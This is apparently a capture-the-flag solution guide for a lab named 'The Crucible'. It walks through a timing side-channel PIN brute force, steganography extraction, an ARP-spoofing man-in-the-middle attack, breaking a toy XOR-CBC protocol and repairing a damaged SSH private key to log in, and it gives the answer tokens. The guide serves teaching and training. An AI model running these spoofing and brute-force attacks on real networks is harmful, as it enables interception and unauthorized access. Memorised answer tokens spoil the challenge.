# The Crucible

*Solution Guide*

## Overview

**The Crucible** places you in the role of an operative tasked with uncovering hidden intelligence across a compromised network. A mysterious signal from honor.us hints at a locked message, protected by a PIN authentication system. A cryptic image on the same server leads to oblivion.us, where covert UDP communications hide encrypted transmissions between two unknown entities. To intercept their exchange, you must launch a man-in-the-middle attack, decrypt their protocol, and extract a secret key. Your final challenge takes you to champion.us.  To get there, you must reconstruct a corrupted SSH private key which holds the last piece of the puzzle — requiring forensic recovery and cryptographic repair to gain access.

## Question 1
Token 1: _After finding the correct pin, what is the token hosted by honor.us (in token.txt)?_

*⚔️ Token 1: Recover the token in the honorable web directory listing.*

*Enter the token locked away for only those with Honor to access.*

We are not given very much information to go off of in this challenge, so we should start by investigating the network. Start by running nmap to discovery hosts on the local network, `10.5.5.0/24`. We will also include the `-p-` option to scan all ports, not just the top 1000 most common ports.

```bash
nmap -p- 10.5.5.0/24
```

The output from running nmap will be the following:

```Text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 16:10 EDT
Nmap scan report for challenge.us (10.5.5.5)
Host is up (0.00063s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
3000/tcp open  ppp
5140/tcp open  unknown
5600/tcp open  esmmanager
MAC Address: 00:50:56:B6:E0:34 (VMware)

Nmap scan report for honor.us (10.5.5.78)
Host is up (0.00054s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
61234/tcp open  unknown
MAC Address: 00:50:56:B6:18:3B (VMware)

Nmap scan report for oblivion.us (10.5.5.129)
Host is up (0.00034s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:B6:58:E5 (VMware)

Nmap scan report for champion.us (10.5.5.130)
Host is up (0.00048s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:B6:76:27 (VMware)

Nmap scan report for phantom.us (10.5.5.133)
Host is up (0.00040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:B6:08:B0 (VMware)

Nmap scan report for kali-crucible.us (10.5.5.74)
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (6 hosts up) scanned in 8.58 seconds
```

Going through the list, we can first immediately recognize ourselves at `kali-crucible.us` and the off limits `challenge.us` server that is used for grading in other challenges. We can safely ignore both of these. That leaves four servers of interest to us.
The `honor.us` server has an `HTTP` service on port `80` and an unknown service on port `61234` (very suspicious!) The remaining servers are `oblivion.us`, `champion.us`, and `phantom.us`, all of which appear to only have an SSH port open at the moment. If you'd like, you can try to SSH into those servers (e.g., `ssh user@phantom.us`), but you'll find those only allow connection via private key, which we do not have.

If you reread the questions, which were fairly vague in the beginning, they now begin to make sense. Each question is hinting at a server. Question 1, our goal for now, mentions Honor, so we should turn our attention to `honor.us` for now.

Let's begin by inspecting the web server on `honor.us`. Opening Firefox and visiting `honor.us` simply gives a directory listing that contains only a single image named `oblivion.jpg`. That matches the name of one of our other servers, and is thus likely connected to the `oblivion.us` server. If you would like to begin investigating this image, jump to [Question 2](#question-2); otherwise, let's take a look at that suspicious port `61234`.

![A screenshot of Firefox with the URL honor.us entered; the page is a simple, default directory listing reading "Index of /". The only file listed is an image file named "oblivion.jpg".](./imgs/honor-first-listing.png "Directory Listing on honor.us")

We have no idea what is running on port `61234`, so let's start by using `netcat` to directly connect to the port.

```bash
nc honor.us 61234
```

We are greeted with the message `It's about time! PIN PLZ`. If we try entering a random PIN, such as 1234, it responds FAIL, but does not close the connection, allowing us to try again. Somehow, we need to determine what the PIN is.
Unfortunately, we have no idea how long the PIN is. If it was relatively short, we could simply bruteforce the PIN (I expect many will try to do just that). However, when we measured it, we could make about 10 guesses a second on average for 4-digit or longer PINs; if the PIN is longer than 6 digits, it would certainly be impossible for us to find it in the time we have allocated. Note in the following screenshot that the formatting is odd due to the server sending back "FAIL" with no newline character.

![A screenshot of a Kali terminal running the previous netcat command to connect to the honor server. Random PINs have been entered such as 1234 and 86312. The server responds with FAIL to all of these.](./imgs/honor-netcat.png "Connecting to honor.us on port 61234")

We will need some sort of way to more quickly narrow down which PIN is correct. Fortunately, we have been given a hint! The message we received at first said `It's about time!`. This is hinting us at one possible source that can be used as part of a side channel attack: `execution time`! Consider the following for loop, written with Python, where `a` and `b` are strings.

```python
for i in range(0, 10):
    if a[i] == b[i]:
        continue
    else:
        exit(0)
```

The number of times the for loop executes will depend on how similar `a` and `b` are. If the first 9 characters are the same, more execution time will be required than if none of the characters are similar. Note this isn't exactly how the code on the server works, but illustrates the purpose.

To retrieve the PIN, we will need a script to take advantage of the side channel attack. The script will need to perform the following general algorithm:

1. Open a connection to honor.us, and discard the opening message
2. Let code = ""
3. For each digit 0-9
   1. Send (code + digit) to honor.us, recording time to send and recv
      1. Note that depending on your timing functions/programming, you may need to account/remove outliers (e.g., due to OS process scheduling)
   2. Find time taken with startTime - endTime
   3. If honor.us responds with FAIL, continue; otherwise, return (code + digit) as final PIN 
4. Set code = (code + digit) where digit is the value 0-9 with the highest send/receive time
5. Repeat step 3-4 until the final PIN is found

The [honor_bruteforce.py](./honor_bruteforce.py) Python script has been provided; the script has comments throughout explaining how it works. The script uses the function `time.perf_counter()` for timing; I did not notice any problematic outliers when testing with this function, but did notice them when using `time.time()`. Such outliers can be handled by sending each guess 2-3 times and taking the minimum execution time. 

The command and corresponding output for running `honor_bruteforce.py` are shown below. The program prints 3 values while it progresses: the PIN so far, the digit that had the longest execution time, and the execution time for that digit. This can help visualize the algorithm described above. At the end, the PIN is revealed to be `1931753842`, recovered in only 30 seconds!

```bash
$ python3 ./honor_bruteforce.py 
Partial match: 1, 1, 0.10069988600002944
Partial match: 19, 9, 0.19093371399998205
Partial match: 193, 3, 0.27104585600000064
Partial match: 1931, 1, 0.34110144200002424
Partial match: 19317, 7, 0.40137055799999644
Partial match: 193175, 5, 0.4517347369999811
Partial match: 1931753, 3, 0.49193623100001105
Partial match: 19317538, 8, 0.5221360399999639
Partial match: 193175384, 4, 0.5417987580000272
Found PIN: 1931753842

Total Time: 29.9 seconds
```

This PIN is not our token, however; it does not match our expected 12-character format and the text suggests we would find it in the web directory listing. If we inspect `honor.us` in Firefox again, we will see that two new files have been added: `token.txt` and `id_rsa`.

![A screenshot of Firefox with the URL honor.us entered. The directory listing now shows three files: "oblivion.jpg", "id_rsa", and "token.txt".](./imgs/honor-second-listing.png "Directory Listing on honor.us After PIN")

We will need the `id_rsa` file later for [Question 3](#question-3); if we open `token.txt`, we will find our token.

![A screenshot of Firefox after clicking and opening the token.txt file. As it is a simple text file, it simply displays the text "b6d79f9faa1e".](./imgs/honor-token.png "The Token on Honor.us")

In this case, the token is `b6d79f9faa1e`.

## Question 2

*👻 Token 2: Retrieve the token echoing out of `oblivion`.*

*Enter the token that echoed out of Oblivion.*

For the next task, we need to find the token on `Oblivion.us`.  As we saw while solving Question 1, there does not appear to be any open ports on `Oblivion.us`. However, we did find that image file on `honor.us`named `oblivion.jpg`.

We can download the image with the `curl` command (or you can use Firefox to download it) and then use `xdg-open` to open it with Kali's default image viewer.

```bash
curl http://honor.us/oblivion.jpg > oblivion.jpg
xdg-open ./oblivion.jpg
```

The image is just a black hole, and does not appear to have anything strange in it when viewed.

![An illustration of a black hole from the University of Chicago. It is shown as an orange ring with stars and other celestial bodies on the outside, but pitch black darkness on the inside.](../challenge/honor/public/oblivion.jpg "Black Hole Image")

At this point, you can begin inspecting the image for hidden data, such as checking the exif data or viewing the file in an hex editor. In this case, the tool we will need is `steghide`, a popular stenography program. We can use the following command to extract any embedded files using no passcode.

```bash
steghide extract -sf oblivion.jpg -p ""
```

Running this command results in `steghide` printing `wrote extracted data to "protocol.txt".`, which means a file named `protocol.txt` was indeed hidden in the image. You can view the file using either `code protocol.txt` or `nano protocol.txt`:

```none
If a phantom shouted a datagram into oblivion, what would it look like?

| Field                     | Size (Bytes)| Description                          |
|---------------------------|-------------|--------------------------------------|
| IV                        | 4           | Initialization Vector for CBC        |
| Encrypted Payload         | 8-1024      | Encrypted data                       |
| |-> Sequence Number       | 4           | Message Ordering, 1-indexed          |
| |-> Message               | 4+          | User data, padded (PKCS#7)          |
```

The first line of this file appears to be suggesting that there is some sort of UDP communication going on between `phantom.us` and `oblivion.us`. That idea is supported by the following table documenting an encrypted communication protocol.

Our goal should now be to eavesdrop on the communication between `phantom.us` and `oblivion.us`.  In this challenge, we do not have access to the `pfSense`, `SecurityOnion`, or other monitoring tools sometimes found in these challenges. Instead, we will need to perform a Man-in-the-Middle (MitM) attack. We don't have access to a Gateway device between the two to intercept their communication, but we don't actually need one since we are on the same local network as them. Instead, we can perform an `ARP spoofing` attack using the `arpspoof` command to convince `oblivion` that we are `phantom` and vice versa. The ARP protocol is used to look up the MAC Address for a given IP Address; the MAC address is the address used to communicate on a local network. The document appears to suggest that `phantom.us` initiates the communication, so let's try to spoof `phantom` first. 

First, let's open `Wireshark` and start capturing on the interface `eth0` by clicking the blue shark fin in the top left corner. In the display filter box, type `udp && ip.dst == OBLIVION_IP`, where `OBLIVION_IP` is replaced with the IP address of `oblivion.us`. You should not notice any packets incoming at the moment.

![A screenshot of the Wireshark application open in Kali. The interface "eth0" is selected, and the mouse is hovering over the blue shark fin which is labelled "Start capturing packets".](./imgs/oblivion-wireshark.png "Opening Wireshark")

Now let's start the arpspoof attack with the following command, which will start spamming `ARP` packets to `phantom.us` that say that the IP Address belonging to `oblivion.us` can be found at our MAC Address. With our MAC address in the packets sent by `phantom.us`, the local network switch will instead send the packets to us. 

```bash
sudo arpspoof -i eth0 -t phantom.us oblivion.us
```

Let arpspoof run in the background, and observe Wireshark. After a few seconds, you should begin to receive packets from `phantom.us`! To stop the attack, hit `CTRL-C` in the terminal, and hit the red square in Wireshark to stop capturing.

With the traffic intercepted, we should now review the communication protocol to see if we can crack the encryption. It mentions CBC, but does not mention any specific encryption algorithm. The IV can be found as the first 4 bytes of the packet. It also mentions a 1-indexed sequence number as the second set of four bytes. This means that the communication must be ordered.

We now need to make some assumptions/guesses and try to figure out the missing pieces. Given what we know, the most likely scenario is that this is XOR CBC encryption with a 4-byte key and block size, and the first four bytes of plaintext will be `00000001` in the first packet.

So let's take one of our packets that we captured and try to test our theory. Don't use the first packet you received. Instead, choose a later packet where it is likely that the client has timed-out and restarted with a new session. Right click on the data field of the packet you want and select Copy > Value. In my case, I got: `29706cd34f74bff279180dbc6b73b3bc6e160cf07b11dcd3`

Breaking that up, we should have:

- `29706cd3` is the IV converted to hex
- `4f74bff2` is the sequence ciphertext in hex; the plaintext should be `00000001`
- `79180dbc6b73b3bc6e160cf07b11dcd3` is the message ciphertext in hex

To get the ciphertext for the sequence number, the process would be `29706cd3` ⊕ `KEY` ⊕ `00000001` = `4f74bff2`. Given the properties of XOR, the following is also true: `29706cd3` ⊕ `4f74bff2` ⊕ `00000001` = `KEY`. Using [Cyberchef](https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'4f74bff2'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'00000001'%7D,'Standard',false)To_Hex('None',0)&input=Mjk3MDZjZDM) to do this for now gives `6604d320` as the KEY value. 

Since CBC is being used, to get the plaintext, we will need to do: KEY ⊕ previous block ⊕ current block  = current plaintext. Going through the message:

- `6604d320` `4f74bff2` `79180dbc` = `5068616e` "Phan"
- `6604d320` `79180dbc` `6b73b3bc` = `746f6d20` "Phantom "
- `6604d320` `6b73b3bc` `6e160cf0` = `63616c6c` "Phantom call"
- `6604d320` `6e160cf0` `7b11dcd3` = `73030303` "Phantom calls..."

In the last block, we have `73030303`. That `030303` is `PKCS#7` padding, which works by padding the block with the length of padding. In this case, we have three bytes of padding, so `03` is used as the padding. Discarding that padding, the final message is `Phantom calls`. Note that PKCS#7 always adds padding, even if the message is evenly divided into blocks; in this case, a message needing no padding would be padded with four bytes, `04040404`.

As this makes sense in context, we can be confident that we have successfully recovered the KEY. The expected course of action now would be to send the encrypted message `Phantom calls` to the server and see what it responds with, but in this case the server and client are expecting a series of call-and-response-style messages. There are four back and forth calls that need to be done, so this could be done by hand, but for this solution guide we will instead automate it using the Python library `scapy`. Scapy will allow us to programmatically capture the incoming packets (note we cannot use typical socket programming as the IP address in the incoming packet will be wrong) and process/modify them. The process for this will be as follows:

1. Start `arpspoof`
2. Sniff for incoming packets with scapy
   1. Decrypt packet and print contents
      1. This will require writing a function to automate the above
   2. If the packet was from `phantom`, modify the source and destination `MAC` addresses and forward the packet to `oblivion`
   3. If the packet was from `oblivion`, modify the source and destination `MAC` addresses and forward the packet to `phantom`

That is, of course, easier said than done. The Python script [phantom_me_oblivion.py](./phantom_me_oblivion.py) accomplishes this task. The script is full of comments explaining how it works.

One final alternative would be to try and interrupt at the end of conversation. That is, you could start `arpspoof`, decrypt the packet that comes back, stop the attack, and try again hoping to receive a different packet in the sequence. This could be faster, but is also less reliable (there are also two items we need to recover here, which we will discover soon).

Before running the script, note that you will need to provide the MAC address of your Kali machine as an argument (you can find this with `ip a`). You will also need to run the script as root.

```bash 
sudo python3 ./phantom_me_oblivion.py {MY_MAC}
```

![A screenshot of the Kali Terminal running the MitM attack script. The messages are printed, and they go through various call and response messages before finally printing a publickey and token.](./imgs/oblivion-token.png "Running MitM Attack")

We can see that `oblivion.us` will eventually send over a public key and the token (underlined in red), which is `b42ec1928e9f` in this case.

## Question 3

*💪 Token 3: Retrieve the token of champions.*

*Prove your dominance and enter the token provided only to a Champion.*

Now all that is left is getting access to `champion.us`. To do so, we will check out the private key (the `id_rsa` file) we earned from `honor.us` and the public key we earned from `oblivion.us`. First, let's check the public key file. If you used the provided script, you'll have a `public_key` file, but since we ran the script as root, that file is owned by root. Change the permissions with `chown` and then print it out.

```bash
sudo chown user ./public_key
cat ./public_key
```

```none
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxzPdoLs8I4xAGj5zi1iMfLWyTPsi63iWxMRzMg0f/U4DW3e+21NMjEkg/o1EabEphXFssa2YcpogcgfREMXdrouwgklwTyPMepNa7EbWPtSsrwxPeQer8oJwKKd5yB3CTsLOiTdvDXGWvbEf2ZQZr7L1y1e0KCgHF8OnoBGth35B9kAiCKOEOcuLyMl+xDXkz7rowZVsdaCldvXZGoxkHQPbK8ku3SVqQfhOxXNyvEe05tshb9sS6GQnUiXsGE8Ry2ozgJYLnc4usCt9CqolklHc3lLgmPHpk5NcJcNxpa/IwQ4MO8cTH+tR1x8F0GEymnDzhhDlaleAZ5KOFHWo5 user@champion.us

```

The public key looks good, no issues. The comment at the end suggests it's intended for `champion.us`, which is where we want to get to. However, the public key can't be used with SSH to log in, so it's unclear still why we need it. If we inspect the `id_rsa` file with `cat id_rsa`, we see the following output; there is clearly something wrong with the provided private key.

```none
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAA8gpXHmRKVx5kQAAAAdzc2gtcnNhAAABAQAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwEAAQAAAQAwj0VG6/nZeIJI+HIl
tcxT2Ikd0fjqqH9s3Hf8FyLTxg+bH3Q33/pmSrj2wHkHGWpbGuk/wXla+9SSzJ9U/JmcCR
wqbS6+rJRR2z1WTCjlPdqzkgzcF+7A3nCfif3Z8NQ7UfhNrKwHuDWBarZgwgi18ytusKST
qFYBpKGNn59gVERsTSj9wE+SVrYcvh5SuP9EjhHQDrDifnAkqZmVgkk6O6iRYijzrWrXun
zjwf3UdRnnA0x5/Eo6pajlZO5GZV1vpN079hxYGLHLhsoKX2o6akDKP7mQ/X5su7KRAhpp
BlUzIUJGNSS8zgK2sy/jPopzm+mLid9QcOWSXwyG7ORNAAAAgQCKB6isdRkYp4fpRhMg12
RVvvTQQmAmnkKBzSIHgs4Rhpgg32O/UuPh/Dz9v29d0cbs2hkMk7ADQIvE8Kjf3fqpwXdt
dgeUfnia6YIue1OQeFfEXyLRIiOnR0qSnLEtPkLPzvbZXTkgSRcZDho268pwj1rvkw3L/I
4vf713Oj/4/wAAAIEA8TqvDhvHHMOZHdGM22q4SSV7vXhNRFsB7PoXSV0lc7ntRF3DT1sE
7xggSTZuJSwrn3e2EPJ63N+lJdKk0BOtpoWxqrWFYePZfHx5jRnwFSxQOvXY3uz6Bwj35v
C+Vl1CrxxvNPavL5fQ+SixQj57X+MDkEJJWV4ho6ZYtjaR8TsAAACBALywBudzTpjKDYY0
VndKVTdqEOVC4MvedMllWtOTxyZf3VUhf6zw7AI+qluISu5Ii+guFW8Jltk1YAfy4Mvozp
z5pDcngKxnLNGNpBeLlJ2HG/ToqjdaMoMAs93hG72uq2lNJabZaLbFZi1UeCj86W7ixURo
X7+zc4Gr5105W1sbAAAAEHVzZXJAY2hhbXBpb24udXMBAg==
-----END OPENSSH PRIVATE KEY-----
```

There are clearly two giant areas of corrupted data there in the middle. Let's base64-decode the key and take a look at what is going on. Create a copy of the key, the strip off the header and footer with `sed` so we are left with just the base64-encoded section. Finally, base64 decode to another new file, and let's take a look at it with a hex editor.

```bash
cp id_rsa private_copy
sed -i '/BEGIN/d' ./private_copy
sed -i '/END/d' ./private_copy
base64 -d ./private_copy > ./private_copy_nob64
xxd ./private_copy_nob64 | less
```

The relevant section of the output from xxd is shown below.

```none
00000000: 6f70 656e 7373 682d 6b65 792d 7631 0000  openssh-key-v1..
00000010: 0000 046e 6f6e 6500 0000 046e 6f6e 6500  ...none....none.
00000020: 0000 0000 0000 0100 0001 1700 0000 0773  ...............s
00000030: 7368 2d72 7361 0000 0003 0100 0100 0001  sh-rsa..........
00000040: 0100 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000140: 0000 0000 03c8 295c 7991 295c 7991 0000  ......)\y.)\y...
00000150: 0007 7373 682d 7273 6100 0001 0100 0000  ..ssh-rsa.......
00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000230: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000260: 0003 0100 0100 0001 0030 8f45 46eb f9d9  .........0.EF...
00000270: 7882 48f8 7225 b5cc 53d8 891d d1f8 eaa8  x.H.r%..S.......
00000280: 7f6c dc77 fc17 22d3 c60f 9b1f 7437 dffa  .l.w..".....t7..
```

Our suspicions were correct, and there are indeed two giant holes in the private key file. If we want access to `champion.us`, we will need to repair it. To do so, we need to understand the layout of the private key file. Finding this information may take some careful searching (wading through many articles talking about the base-64 encoded version, not the actual key itself). Since this can be hard to find, I wanted to list several resources here: 

- https://github.com/openssh/openssh-portable/blob/master/PROTOCOL.key 
  - The official documentation. Very lacking for our purposes, but does give a high level overview we can cross reference
- https://coolaj86.com/articles/the-openssh-private-key-format/
  - This reference gives us what we need, but doesn't go into a lot of details beyond that
- https://dnaeon.github.io/openssh-private-key-binary-format/
  - This reference gives a detailed breakdown of the format, describing exactly how the format was recovered from the official documentation and source code.



We will use the table from the second link as it is the easiest to follow. Just in case that link ever goes down, I've copied the key table here, with one minor modification. In the private key section, the "Public Key parts" were originally in order (e.g., `pub0` then `pub1`); I switched them to be `pub1` then `pub0`, to be clear that the private key section swaps the order of those two fields from what is seen in the public key. Note this is for an unencrypted key, which is what we have.

```none
"openssh-key-v1"0x00    # NULL-terminated "Auth Magic" string
32-bit length, "none"   # ciphername length and string
32-bit length, "none"   # kdfname length and string
32-bit length, nil      # kdf (0 length, no kdf)
32-bit 0x01             # number of keys, hard-coded to 1 (no length)
32-bit length, sshpub   # public key in ssh format
    32-bit length, keytype
    32-bit length, pub0
    32-bit length, pub1
32-bit length for rnd+prv+comment+pad
    64-bit dummy checksum?  # a random 32-bit int, repeated
    32-bit length, keytype  # the private key (including public)
    32-bit length, pub1     # Public Key parts
    32-bit length, pub0     
    32-bit length, prv0     # Private Key parts
    ...                     # (number varies by type)
    32-bit length, comment  # comment string
    padding bytes 0x010203  # pad to blocksize (see notes below)
```

With this, we can begin walking through the file, tracking bytes until we discover the region of null bytes. I imagine most competitors will simply do this by hand for the sake of time, but we can be more organized with a tool like `imhex`, which allows us to label patterns in the hexdump. You can install it with `sudo apt install imhex`. The image belows shows the fully dissected private key; the pattern code I used to generate this can be found in [imhex_pattern_privatekey.hexpat](./imhex_pattern_privatekey.hexpat). Again, this highlighting step is completely optional; all you need to do is identify which field is missing, and where.

![A screenshot of the imhex application showing the hex editor. Each field of the private key is highlighted a different color. There are two large sections of null bytes in orange and red. The orange section of null bytes is selected, and the label is shown as "modulus".](./imgs/champion-imhex.png "Dissected SSH Private Key with imhex")

After walking through the bytes, we will find the first missing chunk is located in the section labelled "public key in ssh format" in the table above. Using the more detailed document, we can see it is the `modulus` that is missing. In RSA, the `modulus` is part of the public key, so we can recover the modulus from the provided public key. The `modulus` is also the component missing in the section labelled "Public Key parts" as part of private key section, so we can use this to repair both empty chunks.

To get the modulus, we need to first base64 decode the public key. Make a copy, extract the base64 string from the file (we can use `cut` for this), and base64-decode. 

```bash
cut -d " " -f2 public_key > public_key_copy
base64 -d public_key_copy > public_key_copy_decoded
```

If you want to view the public key in `imhex`, you can use the provided pattern file to dissect it by switching the last line to read `pubkey pubkey @ 0x0` instead of `privateKey privateKey @ 0x0`. Otherwise, you can identify where the bytes that we need are by hand, as we did with the private key.

![A screenshot of the imhex application showing the hex editor, but for the public key this time. Each field of the public key is highlighted a different color. There is one large section of null data in blue. The blue section is selected, and the label is shown as "modulus".](./imgs/champion-imhex-pub.png "Dissected SSH Private Key with imhex")

The modulus length is 0x0101 (257) bytes, and the modulus starts at offset 0x16 (22). We can use the command `dd` to extract the modulus from the file, and to place it into the private key. First, let's try to extract it to a test file, not our private key.

```bash
dd if="./public_key_copy_decoded" bs=1 count=257 skip=22 > test
xxd test
```

![A screenshot of a hexdump of the test file. It shows that all of the bytes were successfully extracted with dd.](./imgs/champion-dd-check.png "Checking Our dd Command")

That looks correct (e.g., it's the right size, and the beginning and end bytes appear correct).  Now we can try placing it into our private key. The first location we want to put it is at offset 0x41 (65). The second location is at offset 0x15D (349). So, we will run `dd` twice as follows:

```bash
dd if="./public_key_copy_decoded" of="./private_copy_nob64" bs=1 count=257 skip=22 seek=65 conv=notrunc
dd if="./public_key_copy_decoded" of="./private_copy_nob64" bs=1 count=257 skip=22 seek=349 conv=notrunc
```

If you open the private key in `imhex` now (or use `xxd`), you should see the null byte holes have now been filled in with the modulus we needed. Now we just need to encode the fixed private key, and add the header and footer back on, which we can accomplish with the following command. Note it uses the `-w` option to wrap the base64 output into 64-byte lines which is the expected (but not strictly required) format. 

```bash
(echo "-----BEGIN OPENSSH PRIVATE KEY-----"; base64 -w 64 private_copy_nob64 ; echo "-----END OPENSSH PRIVATE KEY-----") > fixed_key
```

We can now try and connect to `champion.us`. First, fix the permissions for the key file, then pass it to ssh. Note you may need to type `yes` when you use `ssh` to connect for the first time.

```bash
chmod 600 ./fixed_key
ssh -i ./fixed_key user@champion.us
```

Piecing that all together, the full set of commands are the following:

```bash
cp id_rsa private_copy
sed -i '/BEGIN/d' ./private_copy
sed -i '/END/d' ./private_copy
base64 -d ./private_copy > ./private_copy_nob64
cut -d " " -f2 public_key > public_key_copy
base64 -d public_key_copy > public_key_copy_decoded
dd if="./public_key_copy_decoded" of="./private_copy_nob64" bs=1 count=257 skip=22 seek=65 conv=notrunc
dd if="./public_key_copy_decoded" of="./private_copy_nob64" bs=1 count=257 skip=22 seek=349 conv=notrunc
(echo "-----BEGIN OPENSSH PRIVATE KEY-----"; base64 -w 64 private_copy_nob64 ; echo "-----END OPENSSH PRIVATE KEY-----") > fixed_key
chmod 600 ./fixed_key
ssh -i ./fixed_key user@champion.us
```

![A screenshot of the kali terminal after using ssh to connect to champion.us. The command ls is run, showing a token.txt file. The command cat is then run, displaying the token value.](./imgs/champion-ssh.png "Connecting to Champion.us")

After connecting to `champion.us`, we can run `ls` and find a `token.txt`. If we `cat` this file, we will receive the final token! In this case, the token is `9f00c5124c64`.
